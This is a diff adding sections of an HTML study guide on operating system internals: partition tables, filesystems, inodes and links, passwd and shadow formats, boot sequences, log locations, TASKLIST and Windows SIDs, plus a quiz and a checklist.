+    <strong>wmic.exe</strong>: Execute processes remotely or locally; spawn child processes<br>
+    <strong>rundll32.exe</strong>: Execute exported DLL functions; often abused to run shellcode-loading DLLs
+  </div>
+</div>
+
+<!-- ============================================================ PARTITIONS -->
+<div class="section" id="partitions">
+  <div class="section-header">
+    <div class="section-icon">💾</div>
+    <div><div class="section-title">Hard Drive Partitioning & File Systems</div><div class="section-meta">MBR · GPT · NTFS · ext4 · inodes · journaling · forensics</div></div>
+  </div>
+
+  <h3>Partition Table Types</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">MBR (Master Boot Record)</div>
+      <ul class="bullets">
+        <li>Located in first 512-byte sector (LBA 0) of disk</li>
+        <li>Contains: 446-byte bootstrap code + 64-byte partition table (4 entries × 16 bytes) + 2-byte signature (0x55AA)</li>
+        <li>Max 4 primary partitions. Workaround: use 1 extended partition containing logical drives</li>
+        <li>Max partition/disk size: 2TB (32-bit LBA addressing)</li>
+        <li>Used with BIOS firmware. Legacy boot method.</li>
+        <li>Single point of failure — damage to first sector = unbootable</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">GPT (GUID Partition Table)</div>
+      <ul class="bullets">
+        <li>Part of UEFI standard. Replaces MBR limitations.</li>
+        <li>Supports up to 128 partitions (no extended partition workaround)</li>
+        <li>Max partition size: 9.4 ZB (zettabytes — effectively unlimited)</li>
+        <li>Header and partition table replicated at both start AND end of disk (redundancy)</li>
+        <li>Each partition has a 128-bit GUID. Protective MBR preserves backward compatibility.</li>
+        <li>Required for UEFI/Secure Boot on modern systems</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Filesystem Types Compared</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Filesystem</th><th>Platform</th><th>Max File Size</th><th>Key Features</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">NTFS</td><td><span class="tag tag-win">Windows</span></td><td>16 EB</td><td>Journaling, ACLs, ADS, compression, encryption (EFS), sparse files, symbolic links, USN journal</td></tr>
+      <tr><td class="cmd-name">FAT32</td><td><span class="tag tag-both">Cross-platform</span></td><td>4 GB</td><td>Maximum compatibility. No ACLs, no journaling. Common for USB/SD cards, EFI system partition</td></tr>
+      <tr><td class="cmd-name">exFAT</td><td><span class="tag tag-both">Cross-platform</span></td><td>16 EB</td><td>FAT32 successor for flash media. No 4GB limit. No journaling. Good for external drives.</td></tr>
+      <tr><td class="cmd-name">ext4</td><td><span class="tag tag-unix">Linux</span></td><td>16 TB (default)</td><td>Default Linux filesystem. Journaling (journal/ordered/writeback modes), extents, delayed allocation, dir_index</td></tr>
+      <tr><td class="cmd-name">XFS</td><td><span class="tag tag-unix">Linux</span></td><td>8 EB</td><td>RHEL/Rocky default. High performance, parallel I/O, good for large files. No shrink support.</td></tr>
+      <tr><td class="cmd-name">Btrfs</td><td><span class="tag tag-unix">Linux</span></td><td>16 EB</td><td>CoW (copy-on-write), snapshots, subvolumes, built-in RAID, checksums. NixOS/openSUSE use.</td></tr>
+      <tr><td class="cmd-name">ZFS</td><td><span class="tag tag-unix">Unix/Linux</span></td><td>256 ZB</td><td>Enterprise-grade. Pooled storage, checksums, snapshots, dedup, RAID-Z. FreeBSD/TrueNAS default.</td></tr>
+      <tr><td class="cmd-name">APFS</td><td><span class="tag tag-both">macOS/iOS</span></td><td>8 EB</td><td>Apple 2017. CoW, encryption, snapshots (Time Machine), clones, nanosecond timestamps</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Journaling Explained</h3>
+  <div class="card">
+    <div class="card-title">Why Journaling Matters</div>
+    <p>Without journaling: if power fails during a write, the filesystem can be left in an inconsistent state requiring slow full fsck scan. A journal (write-ahead log) records intended operations before committing. On recovery, the journal is replayed or rolled back — consistency restored in seconds. Modes: <strong>journal</strong> = log data+metadata (safest, slowest); <strong>ordered</strong> = data written first, then metadata logged (default ext4); <strong>writeback</strong> = only metadata logged (fastest, data may be stale on crash).</p>
+  </div>
+
+  <h3>Inodes (Unix)</h3>
+  <div class="card">
+    <div class="card-title">What Is an Inode?</div>
+    <p>Every file/directory on a Unix filesystem is represented by an inode — a data structure storing metadata: file type, permissions (mode), owner UID/GID, file size, timestamps (atime/mtime/ctime), link count, and pointers to data blocks. The inode does NOT store the filename — filenames are stored in directory entries that map names to inode numbers. A filesystem has a fixed inode table created at format time — you can run out of inodes before running out of disk space (common with millions of small files).</p>
+    <div class="code-block no-prompt">
+      <span class="code-line"><span class="cmd">ls</span> <span class="flag">-i</span> <span class="path">file</span>          <span class="comment"># Show inode number</span></span>
+      <span class="code-line"><span class="cmd">stat</span> <span class="path">file</span>           <span class="comment"># Full inode details</span></span>
+      <span class="code-line"><span class="cmd">df</span> <span class="flag">-i</span>              <span class="comment"># Show inode usage (not space usage)</span></span>
+      <span class="code-line"><span class="cmd">tune2fs</span> <span class="flag">-l</span> <span class="path">/dev/sda1</span> | <span class="cmd">grep</span> <span class="val">inode</span>  <span class="comment"># Filesystem inode info</span></span>
+    </div>
+  </div>
+
+  <h3>Partition & Disk Management Commands</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># Linux</span></span>
+    <span class="code-line"><span class="cmd">lsblk</span>                        <span class="comment"># Tree view of block devices and partitions</span></span>
+    <span class="code-line"><span class="cmd">lsblk</span> <span class="flag">-f</span>                     <span class="comment"># Shows filesystem types and UUIDs</span></span>
+    <span class="code-line"><span class="cmd">fdisk</span> <span class="flag">-l</span>                     <span class="comment"># List partition tables (MBR and GPT)</span></span>
+    <span class="code-line"><span class="cmd">gdisk</span> <span class="path">/dev/sda</span>              <span class="comment"># GPT partition editor</span></span>
+    <span class="code-line"><span class="cmd">parted</span> <span class="flag">-l</span>                    <span class="comment"># List all disk/partition details</span></span>
+    <span class="code-line"><span class="cmd">df</span> <span class="flag">-hT</span>                       <span class="comment"># Disk usage + filesystem type</span></span>
+    <span class="code-line"><span class="cmd">du</span> <span class="flag">-sh</span> <span class="path">/var/log/*</span>           <span class="comment"># Directory sizes</span></span>
+    <span class="code-line"><span class="cmd">mount</span> <span class="path">/dev/sdb1</span> <span class="path">/mnt/usb</span>   <span class="comment"># Mount device to mountpoint</span></span>
+    <span class="code-line"><span class="cmd">mount</span> <span class="flag">-o ro</span> <span class="path">/dev/sdb1 /mnt</span> <span class="comment"># Mount read-only (forensics)</span></span>
+    <span class="code-line"><span class="cmd">umount</span> <span class="path">/mnt/usb</span></span>
+    <span class="code-line"><span class="cmd">blkid</span>                        <span class="comment"># Show UUID, filesystem type per device</span></span>
+    <span class="code-line"><span class="cmd">mkfs.ext4</span> <span class="path">/dev/sdb1</span>         <span class="comment"># Format partition as ext4</span></span>
+    <span class="code-line"><span class="cmd">fsck</span> <span class="path">/dev/sda1</span>              <span class="comment"># Check/repair filesystem (unmounted!)</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># /etc/fstab — persistent mount config</span></span>
+    <span class="code-line"><span class="comment"># UUID=xxx  /home  ext4  defaults,noatime  0  2</span></span>
+    <span class="code-line"><span class="comment"># Fields: device  mountpoint  type  options  dump  fsck-order</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Windows</span></span>
+    <span class="code-line"><span class="cmd">diskpart</span>                     <span class="comment"># Interactive disk management CLI</span></span>
+    <span class="code-line"><span class="cmd">diskmgmt.msc</span>                 <span class="comment"># GUI disk management</span></span>
+    <span class="code-line"><span class="cmd">format D: /fs:ntfs /q</span>        <span class="comment"># Quick format drive D as NTFS</span></span>
+    <span class="code-line"><span class="cmd">chkdsk C: /f /r</span>              <span class="comment"># Check disk, fix errors, recover sectors</span></span>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-label info">// Forensics: Timestamps</div>
+    Unix files have three timestamps: <strong>atime</strong> (last access), <strong>mtime</strong> (last content modification), <strong>ctime</strong> (last metadata change — including permissions, ownership, link count). ctime cannot be modified by normal users. Mount option <code>noatime</code> disables atime updates for performance. Windows NTFS has Created, Modified, Accessed, and Entry Modified ($MFT change) timestamps — all four can be modified with the right tools.
+  </div>
+</div>
+
+<!-- ============================================================ SYSWOW64 -->
+<div class="section" id="syswow64">
+  <div class="section-header">
+    <div class="section-icon">🪟</div>
+    <div><div class="section-title">SysWOW64, System32 & Windows Folders</div><div class="section-meta">32-bit vs 64-bit folders · WOW64 emulator · DLL locations · DEP</div></div>
+  </div>
+
+  <h3>The Counterintuitive Folder Names</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Folder</th><th>Bitness</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">C:\Windows\System32</td><td><span class="tag tag-win">64-bit</span></td><td>Primary Windows system folder — holds 64-bit .dll and .exe files. Despite the name "32", this is the 64-bit system directory on 64-bit Windows.</td></tr>
+      <tr><td class="cmd-name">C:\Windows\SysWOW64</td><td><span class="tag tag-both">32-bit</span></td><td>Holds 32-bit .dll and .exe files. WOW64 = "Windows 32-bit On Windows 64-bit". Despite the name "64", this is the 32-bit compatibility folder.</td></tr>
+      <tr><td class="cmd-name">C:\Program Files</td><td><span class="tag tag-win">64-bit</span></td><td>64-bit application installations.</td></tr>
+      <tr><td class="cmd-name">C:\Program Files (x86)</td><td><span class="tag tag-both">32-bit</span></td><td>32-bit application installations on 64-bit Windows.</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>WOW64 Emulator</h3>
+  <div class="card">
+    <div class="card-title">How 32-bit Apps Run on 64-bit Windows</div>
+    <p><strong>WOW64</strong> (Windows 32-bit On Windows 64-bit) is the x86 emulator subsystem that allows 32-bit applications to run on 64-bit Windows. When a 32-bit application tries to access <code>C:\Windows\System32</code>, WOW64 transparently <strong>redirects it to SysWOW64</strong> — so the 32-bit app gets the 32-bit DLLs it needs without modification. The 64-bit System32 folder is untouched.</p>
+  </div>
+
+  <h3>DLL vs Linux Shared Object</h3>
+  <div class="card">
+    <div class="card-title">Windows DLL ↔ Linux .so</div>
+    <p>Dynamically linked libraries (Windows <code>.dll</code>) and shared objects (Linux <code>.so</code>) are <strong>conceptually the same thing</strong>. Both are containers for executable code and data that can be loaded into a process at runtime, shared across multiple processes, and updated independently of the programs that use them. Key difference: Windows uses the PE format for DLLs; Linux uses the ELF format for .so files.</p>
+  </div>
+
+  <h3>DEP (Data Execution Prevention)</h3>
+  <div class="card">
+    <div class="card-title">DEP — Memory Page Protection</div>
+    <p>DEP is a system-level memory protection feature built into Windows starting with <strong>Windows XP and Windows Server 2003</strong>. DEP enables the system to mark one or more pages of memory as <strong>non-executable</strong> — code cannot run in regions marked as data (stack, heap). Implemented via the CPU's NX bit (Intel) / XD bit (AMD). Prevents shellcode injection attacks that rely on executing data placed in non-code memory regions.</p>
+  </div>
+</div>
+
+<!-- ============================================================ INODES & HDD -->
+<div class="section" id="inodes-hdd">
+  <div class="section-header">
+    <div class="section-icon">💾</div>
+    <div><div class="section-title">Inodes, Hard Drive Anatomy & Links</div><div class="section-meta">inodes · platters · sectors · tracks · hard links · symbolic links · /etc/passwd · /etc/shadow</div></div>
+  </div>
+
+  <h3>Hard Drive Physical Structure</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Component</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Platters</td><td>Physical magnetic disks inside the HDD. Each platter provides top and bottom recording surfaces. A drive may have one or several platters, each with its own read/write head pair.</td></tr>
+      <tr><td class="cmd-name">Tracks</td><td>Concentric circular rings on a platter surface. Data is organized into tracks.</td></tr>
+      <tr><td class="cmd-name">Sectors</td><td>Subdivision of a track. Each sector stores a fixed amount of user-accessible data. The sector is the <strong>minimum storage unit</strong> of a hard drive — traditionally <strong>512 bytes</strong> (Advanced Format drives: 4096 bytes).</td></tr>
+      <tr><td class="cmd-name">Partitions</td><td>Logical sections of the hard drive separated from other segments. Each partition can have its own filesystem.</td></tr>
+      <tr><td class="cmd-name">Inodes</td><td>Provide important information on files: user/group ownership, access mode (R-W-X permissions), and file type. Each file has exactly one inode.</td></tr>
+      <tr><td class="cmd-name">Logical</td><td>Refers to the virtual space within the disk — partitions, filesystems, logical volumes.</td></tr>
+      <tr><td class="cmd-name">Physical</td><td>Refers to the actual hardware — platters, heads, sectors, the physical device itself.</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Inode Contents (Full Detail)</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">What an Inode Stores</div>
+      <ul class="bullets">
+        <li><strong>File type</strong> — regular file, directory, symlink, device, socket, pipe</li>
+        <li><strong>File size</strong> in bytes</li>
+        <li><strong>Timestamps</strong> — creation, access (atime), modification (mtime), metadata change (ctime)</li>
+        <li><strong>File permissions</strong> — read, write, execute for owner/group/other</li>
+        <li><strong>Access Control List</strong> — extended permissions for specific users/groups</li>
+        <li><strong>File protection flags</strong></li>
+        <li><strong>Link count</strong> — number of hard links pointing to this inode</li>
+        <li><strong>File pointers</strong> — addresses of the storage blocks containing file data</li>
+        <li>UID/GID (owner and group)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-title">What an Inode Does NOT Store</div>
+      <ul class="bullets">
+        <li><strong>Filename</strong> — stored in directory entries that map name → inode number</li>
+        <li><strong>Actual file data</strong> — stored in data blocks pointed to by the inode</li>
+      </ul>
+      <div class="callout info" style="margin-top:0.6rem">
+        <div class="callout-label info">// Why this matters</div>
+        Separating name from inode enables: renaming a file without affecting its inode number; multiple filenames (hard links) pointing to the same data; directories treated as files with their own inodes.
+      </div>
+    </div>
+  </div>
+
+  <h3>Hard Links vs Symbolic Links (CNAB Reference)</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Symbolic (Soft) Link</div>
+      <p>Like a Windows shortcut. The file/directory is at one point on disk; the link is a pointer to it. Each symlink has its own inode number, allowing symlinks between different filesystems.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">ln -s</span> <span class="path">test</span> <span class="path">link-to-test</span>  <span class="comment"># Create symlink</span></span>
+        <span class="code-line"><span class="comment"># link-to-test has different inode than test</span></span>
+        <span class="code-line"><span class="comment"># Deleting test = dangling link</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Hard Link</div>
+      <p>Associates two or more filenames sharing the same inode. Each hard link is an exact copy in terms of data and permissions. Changes to one propagate to all. Hard links cannot span filesystems or link directories.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">ln</span> <span class="path">test</span> <span class="path">link-hard-test</span>   <span class="comment"># Create hard link</span></span>
+        <span class="code-line"><span class="cmd">ls -li</span></span>
+        <span class="code-line"><span class="comment"># Both show same inode number</span></span>
+        <span class="code-line"><span class="comment"># 73793 test  73793 link-hard-test</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>/etc/passwd and /etc/shadow Fields</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">/etc/passwd — Format</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="comment"># username:password:UID:GID:GECOS:home:shell</span></span>
+        <span class="code-line"><span class="val">root</span>:x:0:0:root:/root:/bin/bash</span>
+        <span class="code-line"><span class="val">www-data</span>:x:33:33::/var/www:/usr/sbin/nologin</span>
+        <span class="code-line"><span class="comment"># 'x' in password field = hash is in /etc/shadow</span></span>
+        <span class="code-line"><span class="comment"># World-readable — UID/GID mapping for all users</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">/etc/shadow — Format</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="comment"># username:hashed_pw:last_change:min:max:warn:inactive:expire</span></span>
+        <span class="code-line"><span class="val">root</span>:$6$salt$hash...:19000:0:99999:7:::</span>
+        <span class="code-line"><span class="comment"># $6$ = SHA-512; $1$ = MD5; $2b$ = bcrypt</span></span>
+        <span class="code-line"><span class="comment"># Readable only by root</span></span>
+        <span class="code-line"><span class="comment"># 'last_change' = days since epoch</span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================ BOOT & RUNLEVELS -->
+<div class="section" id="boot-runlevel">
+  <div class="section-header">
+    <div class="section-icon">🚀</div>
+    <div><div class="section-title">Boot Processes & Linux Runlevels</div><div class="section-meta">Windows 10 boot · Unix boot · GRUB · init · runlevels · BOOTP/DHCP</div></div>
+  </div>
+
+  <h3>Windows 10 Boot Sequence</h3>
+  <div class="card">
+    <div class="card-title">4-Stage Process</div>
+    <ol style="padding-left:1.5rem;font-size:0.85rem;line-height:2.2;">
+      <li><strong>Pre-Boot</strong> — Power-on Self Test (POST). Loads firmware settings. Checks for valid disk system and valid MBR.</li>
+      <li><strong>Windows Boot Manager</strong> — Checks if multiple OSes on disk. Starts <code>winload.exe</code>.</li>
+      <li><strong>Windows OS Loader</strong> — <code>winload.exe</code> starts important processes to kick-start the Windows kernel.</li>
+      <li><strong>Windows NT OS Kernel</strong> — Picks up registry settings and additional drivers. Control taken by the Session Manager process (<code>smss.exe</code>). GUI is loaded.</li>
+    </ol>
+  </div>
+
+  <h3>Unix/Linux Boot Sequence</h3>
+  <div class="card">
+    <div class="card-title">6-Stage Process</div>
+    <ol style="padding-left:1.5rem;font-size:0.85rem;line-height:2.2;">
+      <li><strong>BIOS</strong> — Executes the MBR (Master Boot Record)</li>
+      <li><strong>MBR</strong> — Executes GRUB (Grand Unified Boot Loader)</li>
+      <li><strong>GRUB</strong> — Executes the Kernel</li>
+      <li><strong>Kernel</strong> — Executes <code>/sbin/init</code> (PID 1)</li>
+      <li><strong>Init</strong> — Executes runlevel programs</li>
+      <li><strong>Runlevel</strong> — Programs executed from <code>/etc/rc.d/rc*.d/</code> (Runlevel 3 is default for servers)</li>
+    </ol>
+  </div>
+
+  <h3>Linux Runlevels</h3>
+  <p style="font-size:0.82rem;color:var(--dim);margin-bottom:0.8rem;">Defined in <code>/etc/inittab</code> which contains descriptions of the different run states the system can assume.</p>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Runlevel</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">0</td><td>Halt the system</td></tr>
+      <tr><td class="cmd-name">1</td><td>Single-user mode (for special administration — no network, maintenance)</td></tr>
+      <tr><td class="cmd-name">2</td><td>Local Multiuser with Networking but without network services (like NFS)</td></tr>
+      <tr><td class="cmd-name">3</td><td>Full Multiuser with Networking (default on most servers)</td></tr>
+      <tr><td class="cmd-name">4</td><td>Not Used (reserved / custom)</td></tr>
+      <tr><td class="cmd-name">5</td><td>Full Multiuser with Networking and X Windows GUI (<strong>X11</strong>) — default on desktops</td></tr>
+      <tr><td class="cmd-name">6</td><td>Reboot</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout info">
+    <div class="callout-label info">// systemd Targets</div>
+    Modern Linux with systemd uses <strong>targets</strong> instead of runlevels: <code>multi-user.target</code> ≈ RL3, <code>graphical.target</code> ≈ RL5, <code>rescue.target</code> ≈ RL1, <code>poweroff.target</code> ≈ RL0, <code>reboot.target</code> ≈ RL6.
+  </div>
+
+  <h3>BOOTP vs DHCP</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">BOOTP</div>
+      <p>Allows a <strong>diskless client machine</strong> to discover its own IP address, the address of a server host, and the name of a file to be loaded into memory and executed. Static assignments — no lease concept.</p>
+    </div>
+    <div class="card">
+      <div class="card-title">DHCP</div>
+      <p>Based on BOOTP; adds <strong>automatic allocation of reusable network addresses</strong> and additional configuration options. DHCP can interoperate with BOOTP clients via relay agents. Process: <strong>D</strong>iscover → <strong>O</strong>ffer → <strong>R</strong>equest → <strong>A</strong>cknowledge.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================ LOG LOCATIONS -->
+<div class="section" id="log-locations">
+  <div class="section-header">
+    <div class="section-icon">📁</div>
+    <div><div class="section-title">Log & DNS File Locations</div><div class="section-meta">Windows event logs · Unix /var/log · resolv.conf · hosts file</div></div>
+  </div>
+
+  <h3>Windows Log Locations</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Log / File</th><th>Location</th><th>Contents</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Event Logs</td><td>C:\WINDOWS\system32\config\</td><td>Binary .evtx files. Categorized by circumstance: Event, Error, Warning, Information</td></tr>
+      <tr><td class="cmd-name">Modern .evtx Logs</td><td>C:\Windows\System32\winevt\Logs\</td><td>Security.evtx (auditing), System.evtx (OS/drivers), Application.evtx</td></tr>
+      <tr><td class="cmd-name">DNS Info</td><td>C:\WINDOWS\system32\DNS\</td><td>DNS server zone files</td></tr>
+      <tr><td class="cmd-name">Hosts File</td><td>C:\Windows\System32\drivers\etc\hosts</td><td>Static hostname → IP mappings. Owned by NT AUTHORITY\SYSTEM. Admin-only modification.</td></tr>
+      <tr><td class="cmd-name">DNS Resolver Config</td><td>Registry + ipconfig settings</td><td>DNS servers set via DHCP or static network configuration</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Unix/Linux Log Locations</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>File</th><th>Contents</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">/var/log/</td><td>Primary log directory for all system and application logs</td></tr>
+      <tr><td class="cmd-name">/var/log/messages</td><td>General messages and system-related info</td></tr>
+      <tr><td class="cmd-name">/var/log/auth.log</td><td>Authentication logs — SSH logins, sudo, su, PAM events</td></tr>
+      <tr><td class="cmd-name">/var/log/kern.log</td><td>Kernel messages</td></tr>
+      <tr><td class="cmd-name">/var/log/cron.log</td><td>crond execution logs</td></tr>
+      <tr><td class="cmd-name">/var/log/maillog</td><td>Mail server logs</td></tr>
+      <tr><td class="cmd-name">/var/log/syslog</td><td>General system log (Debian/Ubuntu)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>DNS Resolver Configuration</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Linux: /etc/resolv.conf</div>
+      <p>Defines how the system uses DNS to resolve hostnames and IPs. Contains up to three nameserver lines and search domain configuration.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="comment"># /etc/resolv.conf example</span></span>
+        <span class="code-line"><span class="val">search</span> us.mydomain.com mydomain.com</span>
+        <span class="code-line"><span class="val">nameserver</span> 192.168.154.3</span>
+        <span class="code-line"><span class="val">nameserver</span> 192.168.154.4</span>
+        <span class="code-line"><span class="val">nameserver</span> 10.216.106.3</span>
+        <span class="code-line"><span class="comment"># DHCP typically writes this file automatically</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Windows: hosts file</div>
+      <p>Plain text file at <code>C:\Windows\System32\drivers\etc\hosts</code>. Maps hostnames to IP addresses. Checked before DNS. Owned by NT AUTHORITY\SYSTEM — only modifiable by administrator. Attacker modification = DNS hijacking on the local machine.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================ TASKLIST & SIDS -->
+<div class="section" id="tasklist-sids">
+  <div class="section-header">
+    <div class="section-icon">🔍</div>
+    <div><div class="section-title">Tasklist, TTL & Windows SIDs</div><div class="section-meta">TASKLIST /SVC · TTL values · SID table · hardware/software/firmware</div></div>
+  </div>
+
+  <h3>TASKLIST — Querying Services and PIDs</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Query by Service Name</div>
+      <p>Find the PID of a process hosting a specific service. Example: find PID of the Print Spooler service:</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">TASKLIST</span> <span class="flag">/SVC /FI</span> <span class="val">"SERVICES eq Spooler"</span></span>
+        <span class="code-line"><span class="comment"># Output shows PID in the central column</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Query by PID</div>
+      <p>Before force-killing a process, confirm what services would be stopped. Example: see all services running in PID 1284:</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">TASKLIST</span> <span class="flag">/SVC /FI</span> <span class="val">"PID eq 1284"</span></span>
+        <span class="code-line"><span class="comment"># May show 5+ services in one svchost</span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Remote Machine Query Flags</div>
+    <p>TASKLIST can interrogate remote machines. Add <code>/S</code> (system), <code>/U</code> (username), and <code>/P</code> (password) flags:</p>
+    <div class="code-block no-prompt">
+      <span class="code-line"><span class="cmd">TASKLIST</span> <span class="flag">/S</span> <span class="val">\\RemotePC</span> <span class="flag">/U</span> <span class="val">domain\user</span> <span class="flag">/P</span> <span class="val">password</span> <span class="flag">/SVC</span></span>
+    </div>
+  </div>
+
+  <h3>TTL Values by Operating System</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>OS / Device</th><th>Default TTL</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Linux</td><td>64</td><td>Common default. Each hop decrements by 1.</td></tr>
+      <tr><td class="cmd-name">Windows</td><td>128</td><td>Higher default than Linux.</td></tr>
+      <tr><td class="cmd-name">Cisco IOS</td><td>255</td><td>Maximum TTL value.</td></tr>
+      <tr><td class="cmd-name">macOS / BSD</td><td>64</td><td>Same as Linux default.</td></tr>
+      <tr><td class="cmd-name">Solaris</td><td>255</td><td>Maximum default.</td></tr>
+    </tbody>
+  </table></div>
+  <div class="callout info">
+    <div class="callout-label info">// OS Fingerprinting via TTL</div>
+    By observing the TTL value in ping responses, you can estimate the originating OS. A TTL near 64 suggests Linux/macOS; near 128 suggests Windows; near 255 suggests Cisco or Solaris. Subtract hops to get the original value.
+  </div>
+
+  <h3>Windows SID Reference</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>SID Schema</th><th>Account / Description</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">S-1-5-21-[domain]-500</td><td>Local Administrator (built-in admin account, RID 500)</td></tr>
+      <tr><td class="cmd-name">S-1-5-21-[domain]-501</td><td>Local Guest (built-in guest account, RID 501)</td></tr>
+      <tr><td class="cmd-name">S-1-5-21-[domain]-512</td><td>Domain Administrators group</td></tr>
+      <tr><td class="cmd-name">S-1-5-18</td><td>Local System (NT AUTHORITY\SYSTEM) — highest local privilege</td></tr>
+      <tr><td class="cmd-name">S-1-5-19</td><td>Local Service (NT AUTHORITY\LOCAL SERVICE)</td></tr>
+      <tr><td class="cmd-name">S-1-5-20</td><td>Network Service (NT AUTHORITY\NETWORK SERVICE)</td></tr>
+      <tr><td class="cmd-name">S-1-1-0</td><td>Everyone — all users including anonymous</td></tr>
+      <tr><td class="cmd-name">S-1-5-11</td><td>Authenticated Users — logged-in users only (excludes anonymous)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Hardware vs Software vs Firmware</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Type</th><th>Definition</th><th>Examples</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">Hardware</td><td>The physical machines, wiring, and electronic components of a computer system</td><td>CPU, RAM, NIC, HDD, keyboard, monitor</td></tr>
+      <tr><td class="cmd-name">Software</td><td>A set of instructions, data, or programs used to operate computers and execute specific tasks</td><td>Windows, Linux, Microsoft Office, Firefox</td></tr>
+      <tr><td class="cmd-name">Firmware</td><td>Software that provides <strong>semi-permanent</strong> basic machine instructions that allow the hardware to function and communicate with other software. Stored in non-volatile flash on the device itself.</td><td>BIOS/UEFI, NIC firmware, SSD controller firmware, router firmware</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Bit Bucket</h3>
+  <div class="card">
+    <div class="card-title">/dev/null — The Bit Bucket</div>
+    <p>The <strong>bit bucket</strong> is where lost or discarded computer data has gone. Any data which does not end up where it is supposed to — lost in transmission, from a crash, or explicitly discarded — is said to have gone to the bit bucket.</p>
+    <div class="code-block no-prompt">
+      <span class="code-line"><span class="comment"># Unix: /dev/null is the bit bucket</span></span>
+      <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="path">/dev/null</span> 2&gt;&amp;1  <span class="comment"># Discard all output</span></span>
+      <span class="code-line"></span>
+      <span class="code-line"><span class="comment"># Windows: NUL is the bit bucket</span></span>
+      <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="val">NUL</span>            <span class="comment"># Discard stdout</span></span>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================ QUIZ -->
+<div class="section" id="quiz">
+  <div class="section-header">
+    <div class="section-icon">🧠</div>
+    <div><div class="section-title">Knowledge Check</div><div class="section-meta">20 questions · multiple choice · instant feedback</div></div>
+  </div>
+  <div id="quizContainer"></div>
+</div>
+
+<!-- ============================================================ CHECKLIST -->
+<div class="section" id="checklist">
+  <div class="section-header">
+    <div class="section-icon">✅</div>
+    <div><div class="section-title">Mastery Checklist</div><div class="section-meta">click to mark as learned — 30 objectives</div></div>
+  </div>
+  <ul class="checklist" id="masteryList">
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Interpret all columns in ps aux output (USER, PID, STAT codes, VSZ/RSS)</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Use netstat/ss to identify LISTEN vs ESTABLISHED connections and owning process</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Read TCP state machine: TIME_WAIT, SYN_RECV, CLOSE_WAIT significance</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Configure /etc/hosts, /etc/resolv.conf, and /etc/nsswitch.conf</span></li>
